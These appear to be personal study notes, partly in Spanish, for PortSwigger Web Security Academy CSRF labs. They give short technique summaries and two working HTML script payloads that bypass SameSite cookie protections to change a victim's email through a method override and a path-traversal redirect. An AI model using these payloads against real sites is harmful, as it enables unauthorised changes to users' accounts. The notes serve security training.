## Lab: CSRF where token validation depends on request method

![Pasted_image_20251102002709.png](img/Pasted_image_20251102002709.png)

## Lab: CSRF where token validation depends on token being present

No enviar el CSRF token en la request, ni siquiera su parametro 

## Lab: CSRF where token is not tied to user session

Reutilizar un token csrf de un usuario valido ya que puede no validar si en realidad pertenece a la sesión del usuario 

## Lab: CSRF where token is tied to non-session cookie
![Pasted image 20251102020725.png](img/Pasted_image_20251102020725.png)

## Lab: CSRF where token is duplicated in cookie

![Pasted image 20251102022025.png](img/Pasted_image_20251102022025.png)
![Pasted image 20251102022031.png](img/Pasted_image_20251102022031.png)

## Lab: SameSite Lax bypass via method override

```html
<script>
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
</script>
```

## Lab: SameSite Strict bypass via client-side redirect

```html
<script>
  window.location.href = "https://0a4900b604a870af8113fd31009a00eb.web-security-academy.net/post/comment/confirmation?postId=../../my-account/change-email?email=port%40hola.com%26submit=1";
</script>
```

## Lab: SameSite Strict bypass via sibling domain

